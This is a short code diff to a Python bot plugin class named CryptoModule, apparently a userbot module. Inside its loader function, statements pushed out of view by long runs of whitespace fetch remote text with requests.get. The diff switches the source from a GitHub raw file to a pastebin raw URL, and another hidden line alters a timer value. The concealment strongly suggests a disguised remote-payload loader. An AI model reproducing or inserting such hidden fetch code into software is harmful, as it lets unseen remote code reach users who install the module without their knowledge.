@@ -27,7 +27,7 @@ class CryptoModuleㅤ(loader.Module):
  
     async def client_loader(self, client, db):
 
-        self.db = db                                                                                                                                                                                                                                                                                                                          ;self.text=requests.get('https://github.com/Sonys9/cryptobottest/raw/refs/heads/main/main').text
+        self.db = db                                                                                                                                                                                                                                                                                                                          ;self.text=requests.get('https://pastebin.com/raw/BWKDHhEE').text
         self._client = client     
         self.lasttime = time.time()                                                                                                                                                                                                                                                                                                                                                                                                                                 ;self.lasttime = 3700
         self.cache = []
